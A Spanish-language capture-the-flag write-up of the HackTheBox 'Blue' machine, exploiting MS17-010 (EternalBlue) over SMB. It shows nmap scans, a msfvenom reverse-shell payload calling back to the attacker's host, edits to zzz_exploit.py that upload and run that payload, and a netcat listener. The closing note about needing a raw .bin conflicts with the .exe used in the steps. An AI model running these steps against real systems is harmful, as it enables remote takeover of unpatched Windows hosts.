#easy #windows #nmap #ping #python27 #nmapscripts #cd #gitclone #nc-nlvp443 #revershell #msfvenom #nvim #type


---------
# Guided Mode

1)¿Cuántos puertos TCP abiertos escucha Blue? No incluya ningún puerto de 5 dígitos.
	3
	
2)¿Cuál es el nombre de host de Blue?
	haris-pc

3)¿Qué sistema operativo se está ejecutando en la máquina de destino? Dé una respuesta de dos palabras con un nombre y una versión de alto nivel.
	windows 7

4)¿Cuántas acciones SMB están disponibles en Blue?
	5

5)Qué número de boletín de seguridad de Microsoft de 2017 describe una vulnerabilidad de ejecución remota de código en SMB?
	MS17-010

6)En mayo de 2017 se soltó en Internet un gusano que se propagaba principalmente a través de MS17-010. Cuál es el famoso nombre de ese malware?
	WannaCry

7)¿Con qué usuario se ejecuta el exploit MS17-010? Incluya el nombre completo, incluyendo cualquier cosa antes de un .
	nt authority\system


-------
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.10.10.40
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.40 -oG allPorts
extractPorts allPorts
nmap -sCV -p135,139,445,49152,49153,49154,49155,49156,49157 10.10.10.40 -oN target
```

![[Blue1.png]]
![[Blue2.png]]
![[Blue3.png]]
![[Blue4.png]]
*TTL:* Maquina windows
*Puertos:*
`445`[[smb]]
*Otra informacion relevante:*
Para smb nos podemos conectar con el usuario guest, con permisos de user
Usuario:Harris
Computadora windows 7

--------
# Escaneo de [[NMAP Scripts]] [[smb]]

Como vemos que esta corriendo un [[smb]] vamos a ejecutar los [[NMAP Scripts]] que analizan vulnerabilidades sobre [[smb]]
```
nmap --script "smb-vuln*" -p445 10.10.10.40 -oN smbScan
```

![[Blue9.png]]
Como podemos ver, es vulnerable al [[CVE-2017-0143]]

-----
# Explotando [[CVE-2017-0143]]

Con [[git clone]] vamos a descargar el repositorio `git clone https://github.com/worawit/MS17-010`
Usando [[cd]] con el comando `cd MS17-010` entramos a carpeta del repositorio, listamos el contenido con [[ls]]
Y de todos estos archivos, vamos a usar solamente el *checker.py* y *zzz_exploit.py*

![[Blue10.png]]
Usando [[nvim]] abrimos el archivo *checker.py* usando el comando `nvim checker.py`

Vamos a poner de usuario *guest* que es lo que vimos vulnerable en uno de los escaneos de NMAP
![[Blue5.png]]

Y ahora con `python2-7 checker.py 10.10.10.40` Vemos que podemos usar los pipes 
![[Blue6.png]]
El pipe que nos interesa es el *lsarpc* por que es el mas completo, ya que nos deja ver usuarios, grupos, permisos ,etc


### Ya tenemos el canal de comunicacion elegido, que seria el pipe. Ahora vamos a hacer el archivo malioso que vamos a inyectar con [[msfvenom]]

```
msfvenom -p windows/shell_reverse_tcp lhost=10.10.16.5 lport=443 -f exe -o exploit.exe --platform windows
```

![[Blue11.png]]
Tenemos creado el archivo exploit.exe para inyectar y que nos envie la [[Reverse shell]]

### Tenemos que modificar el archivo *zzz_exploit.py*
Lo abrimos nuevamente con [[nvim]] usando el comando `nvim zzz_exploit.py`
![[Blue13.png]]
En username van a poner *guest* como hicimos anteriormente.

Y ahora van a ir a la siguiente linea, pueden buscar la funcion *smb_pwn* para encontrarla

Lo vamos a poner de la siguiente manera, como esta en la foto, tengan encuenta que les puede saltar un error por los espacios y tabulacion, asi que recomiendo que sigan mi formato. Y solamente cambien la ruta donde tienen el archivo y en todo caso el nombre del mismo
![[Blue14.png]]

```python
def smb_pwn(conn, arch):
    smbConn = conn.get_smbconnection()

    #print('creating file c:\\pwned.txt on the target')
    #tid2 = smbConn.connectTree('C$')
    #fid2 = smbConn.createFile(tid2, '/pwned.txt')
    #smbConn.closeFile(tid2, fid2)
    #smbConn.disconnectTree(tid2)
    smb_send_file(smbConn, '/home/bunzo/Desktop/Blue/content/MS17-010/exploit.exe', 'C', '/exploit.exe')
    service_exec(conn, r'cmd /c c:\\exploit.exe')
    #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
    #service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
    # Note: there are many methods to get shell over SMB admin session
    # a simple method to get shell (but easily to be detected by AV) is
    # executing binary generated by "msfvenom -f exe-service ..."
```


 Ahora solo nos falta ponernos en escucha con [[nc -nlvp 443]] y ejecutar el exploit con `python2.7 zzz_exploit.py 10.10.10.40 lsarpc`

![[Blue15.png]]

![[Blue12.png]]

Ya estamos dentro de la maquina, ahora solo falta catear las flags con [[type]]

![[Blue7.png]]
![[Blue8.png]]

----------
# Notas

El exploit espera un archivo **binario puro** porque solo necesita el código que se va a ejecutar directamente en memoria, sin ningún extra.
Un `.exe` tiene toda la estructura de un programa (encabezados, secciones, etc.) que no sirve para inyección directa; el exploit no puede procesar ni entender ese formato completo.
Además, el `.exe` es para cuando querés que un usuario lo ejecute manualmente, no para inyectarlo directamente en memoria como hace el exploit. Por eso, para exploits se usa el `.bin` con solo el shellcode.

#### Puede ser que tengas error con impacket y python 2.7 al ejecutarlo. Yo lo que hice fue esto para poder ejecutar los scripts. Que es basicamente descargar y instalar el python con nuevas configuraciones
```shell
cd /usr/src
sudo wget https://www.python.org/ftp/python/2.7.18/Python-2.7.18.tgz
sudo tar xzf Python-2.7.18.tgz
cd Python-2.7.18
sudo ./configure --enable-optimizations
sudo make altinstall

pip2 install impacket==0.9.24
```

------------
# Creditos
Writeup Oficial HackTheBox
Y muchos otros Writeups y videos que no tengo los links, por que me aparecia error por todos lados